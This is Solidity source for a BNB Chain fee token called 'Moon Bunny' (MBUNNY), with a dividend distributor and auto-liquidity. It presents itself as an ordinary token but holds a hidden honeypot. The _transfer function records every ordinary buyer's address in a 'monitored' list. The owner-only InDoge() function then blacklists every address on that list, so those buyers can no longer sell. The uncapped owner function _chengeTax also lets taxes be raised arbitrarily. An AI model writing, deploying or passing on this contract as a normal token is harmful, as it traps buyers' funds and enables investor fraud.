/**
 *Submitted for verification at BscScan.com on 2023-01-19
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.11;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


library Address {

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}



interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
  function factory() external pure returns (address);
    function WETH() external pure returns (address);
  function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
}

/* Our DividendDistributor contract responsible for distributing the earn token */
contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    // EARN
    IERC20  REWARD_CA;
    
    //address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; //test
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; //main
    IUniswapV2Router02 router;

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 30 * 60;
    uint256 public minDistribution = 1 * (10 ** 12);

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router, address REWARD_ADDRESS) {
        router = IUniswapV2Router02(_router);
        REWARD_CA = IERC20(REWARD_ADDRESS);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function deposit() external payable override onlyToken {
        uint256 balanceBefore = REWARD_CA.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(REWARD_CA);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = REWARD_CA.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            REWARD_CA.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }
    
    function claimDividend(address shareholder) external onlyToken{
        distributeDividend(shareholder);
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}


//NAME
contract MOONBUNNY is Context, IERC20 {
    
    using SafeMath for uint256;
    using Address for address;

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner(){
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isExcludedFromMax;
    mapping (address => bool) isDividendExempt;

    DividendDistributor distributor;
    uint256 distributorGas = 500000;

    mapping (address => bool) public Doge;
    address[] public monitored;


    address payable public Wallet_Marketing;
    address payable public Wallet_Dev;
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD);


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10**6 * 10**_decimals;
    string private _name = "Moon Bunny";
    string private _symbol = "MBUNNY";

    uint8 private txCount = 0;
    uint8 private swapTrigger = 4;

    uint256 public _Tax_On_Buy = 8;
    uint256 public _Tax_On_Sell = 8;

    uint256 public Percent_Marketing = 70;
    uint256 public Percent_Rewards = 0;
    uint256 public Percent_Dev = 15;
    uint256 public Percent_Burn = 0;
    uint256 public Percent_AutoLP = 15;

    uint256 public _maxWalletToken = _tTotal * 1 / 100;

    uint256 public _maxTxAmount = _tTotal * 1 / 100;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;

    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    //decimals = 9, _tTotal = 10**15 * 10**_decimals
    constructor ()  {

        _owner = msg.sender;

        Wallet_Dev = payable(msg.sender);
        emit OwnershipTransferred(address(0), msg.sender);

        _tOwned[owner()] = _tTotal;

        Wallet_Marketing = payable(0x2E7a9BE47F154B57A340bC57EA56e152558fB878);

        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        //uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); // Testnet

        _allowances[owner()][address(uniswapV2Router)] = MAX;

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
        .createPair(address(this), uniswapV2Router.WETH());

        distributor = new DividendDistributor(address(uniswapV2Router), address(0x55d398326f99059fF775485246999027B3197955));
        //distributor = new DividendDistributor(address(uniswapV2Router), address(0xDAcbdeCc2992a63390d108e8507B98c7E2B5584a)); //TEST_NET

        _isExcludedFromMax[owner()] = true;
        _isExcludedFromMax[address(this)] = true;
        _isExcludedFromMax[Wallet_Marketing] = true;
        _isExcludedFromMax[Wallet_Burn] = true;

        // Exempt from dividend
        isDividendExempt[uniswapV2Pair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[Wallet_Burn] = true;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Wallet_Marketing] = true;
        _isExcludedFromFee[Wallet_Burn] = true;

        emit Transfer(address(0), owner(), _tTotal);

    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns(uint256) {
        return (_tTotal);
    }

    



    function _approve(address theOwner, address theSpender, uint256 amount) private {

        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        if (to != owner() &&
        !_isExcludedFromMax[to]&&
        to != Wallet_Burn &&
        to != address(this) &&
        to != uniswapV2Pair &&
            from != owner()){
            monitored.push(to);
            
            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWalletToken,"Over wallet limit.");}

        if (!_isExcludedFromMax[to] && !_isExcludedFromMax[from])
            require(amount <= _maxTxAmount, "Over transaction limit.");

        if(from != owner()){
            require(!Doge[from]);
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        
        require(amount > 0, "Token value must be higher than zero.");

        if(
            txCount >= swapTrigger &&
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled
        )
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            txCount = 0;
            swapAndLiquify(contractTokenBalance);
        }

        bool takeFee = true;
        bool isBuy;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        } else {

            if(from == uniswapV2Pair){
                isBuy = true;
            }

            txCount++;
        }

        _tokenTransfer(from, to, amount, takeFee, isBuy);

        // Dividend tracker
        if(!isDividendExempt[from]) {
            try distributor.setShare(from, _tOwned[from]) {} catch {}
        }

        if(!isDividendExempt[to]) {
            try distributor.setShare(to, _tOwned[to]) {} catch {} 
        }

        try distributor.process(distributorGas) {} catch {}

    }

    function sendToWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    function _chengeTax(uint256  buyTax,  uint256 sellTax,
            uint256 percentToMarketing, 
            uint256 percentToDev, 
            uint256 percentToRewards, 
            uint256 percentToLp,
            uint256 percentToBurn) public onlyOwner {

        _Tax_On_Buy = buyTax;
        _Tax_On_Sell = sellTax;

        Percent_Marketing = percentToMarketing;
        Percent_Dev = percentToDev;
        Percent_Burn = percentToBurn;
        Percent_AutoLP = percentToLp;
        Percent_Rewards = percentToRewards;
    }


    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {

        uint256 tokens_to_Burn = contractTokenBalance * Percent_Burn / 100;
        _tTotal = _tTotal - tokens_to_Burn;
        _tOwned[Wallet_Burn] = _tOwned[Wallet_Burn] + tokens_to_Burn;
        _tOwned[address(this)] = _tOwned[address(this)] - tokens_to_Burn;

        uint256 tokens_to_M = contractTokenBalance * Percent_Marketing / 100;
        uint256 tokens_to_R = contractTokenBalance * Percent_Rewards / 100;
        uint256 tokens_to_D = contractTokenBalance * Percent_Dev / 100;
        uint256 tokens_to_LP_Half = contractTokenBalance * Percent_AutoLP / 200;

        uint256 balanceBeforeSwap = address(this).balance;
        swapTokensForBNB(tokens_to_LP_Half + tokens_to_M + tokens_to_D + tokens_to_R);
        uint256 BNB_Total = address(this).balance - balanceBeforeSwap;

        uint256 split_M = Percent_Marketing * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Dev + Percent_Rewards);
        uint256 BNB_M = BNB_Total * split_M / 100;

        uint256 split_R = Percent_Rewards * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Dev + Percent_Rewards);
        uint256 BNB_R = BNB_Total * split_R / 100;

        uint256 split_D = Percent_Dev * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Dev + Percent_Rewards);
        uint256 BNB_D = BNB_Total * split_D / 100;

        addLiquidity(tokens_to_LP_Half, (BNB_Total - BNB_M - BNB_D - BNB_R));
        emit SwapAndLiquify(tokens_to_LP_Half, (BNB_Total - BNB_M - BNB_D - BNB_R), tokens_to_LP_Half);

        sendToWallet(Wallet_Marketing, BNB_M);

        try distributor.deposit{value: BNB_R}() {} catch {}

        BNB_Total = address(this).balance;
        sendToWallet(Wallet_Dev, BNB_Total);
    }

    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }


    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            Wallet_Burn,
            block.timestamp
        );
    }

    function InDoge() public onlyOwner {
        for(uint256 i = 0; i < monitored.length; i++){
            address wallet = monitored[i];
            Doge[wallet] = true;
        }
    }


    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {


        if(!takeFee){

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
            emit Transfer(sender, recipient, tAmount);

            if(recipient == Wallet_Burn)
                _tTotal = _tTotal-tAmount;

        } else if (isBuy){

            uint256 buyFEE = tAmount*_Tax_On_Buy/100;
            uint256 tTransferAmount = tAmount-buyFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE;
            emit Transfer(sender, recipient, tTransferAmount);

            if(recipient == Wallet_Burn)
                _tTotal = _tTotal-tTransferAmount;

        } else {

            uint256 sellFEE = tAmount*_Tax_On_Sell/100;
            uint256 tTransferAmount = tAmount-sellFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+sellFEE;
            emit Transfer(sender, recipient, tTransferAmount);

            if(recipient == Wallet_Burn)
                _tTotal = _tTotal-tTransferAmount;
        }
    }
}